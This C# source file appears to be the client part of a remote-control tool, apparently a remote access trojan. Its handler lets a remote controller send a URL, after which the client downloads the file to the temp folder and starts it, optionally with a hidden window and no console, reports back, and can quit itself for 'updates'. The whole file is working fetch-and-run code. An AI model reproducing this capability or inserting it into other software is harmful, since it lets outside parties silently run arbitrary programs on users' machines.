using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Threading;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestDownloadExecHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestDownloadExec;
                    if (req == null) return;

                    string tempDir = GetTempPath();
                    string fileName = Path.GetFileName(new Uri(req.Url).LocalPath);
                    if (string.IsNullOrEmpty(fileName)) fileName = "download.exe";
                    string filePath = Path.Combine(tempDir, fileName);

                    using (WebClient wc = new WebClient())
                    {
                        wc.DownloadFile(req.Url, filePath);
                    }

                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = filePath;
                    if (!req.ShowWindow)
                    {
                        psi.WindowStyle = ProcessWindowStyle.Hidden;
                        psi.CreateNoWindow = true;
                    }

                    var resp = new ResponseDownloadExec();
                    resp.Result = true;
                    resp.Message = req.IsUpdate ? "下载更新已启动" : "下载执行完成";
                    session.Send(ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE, resp);

                    Process.Start(psi);

                    if (req.IsUpdate)
                    {
                        Thread.Sleep(1000);
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                    var resp = new ResponseDownloadExec();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE, resp);
                }
            });
        }
    }
}
